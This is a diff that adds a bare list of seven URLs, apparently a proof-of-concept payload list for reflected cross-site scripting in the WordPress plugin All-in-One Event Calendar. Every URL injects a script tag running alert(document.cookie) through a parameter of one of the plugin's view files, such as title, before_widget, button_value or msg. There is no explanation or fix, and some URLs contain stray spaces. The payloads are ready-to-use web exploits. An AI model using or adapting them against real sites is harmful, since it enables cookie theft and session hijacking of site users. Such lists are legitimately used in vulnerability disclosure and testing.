@@ -1,0 +1,13 @@
+http://wp/wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget-form.php?title[id]=%22 %3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://wp/wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget.php?args[before_widget ]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://wp/wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget.php?title=%3Cscript%3E alert%28document.cookie%29;%3C/script%3E
+
+http://wp/wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget.php?title=1&before _title=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://wp/wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget.php?title=1&after_ title=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://wp/wp-content/plugins/all-in-one-event-calendar/app/view/box_publish_button.php?button_value= %22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://wp/wp-content/plugins/all-in-one-event-calendar/app/view/save_successful.php?msg=%3Cscript%3E alert%28document.cookie%29;%3C/script%3E
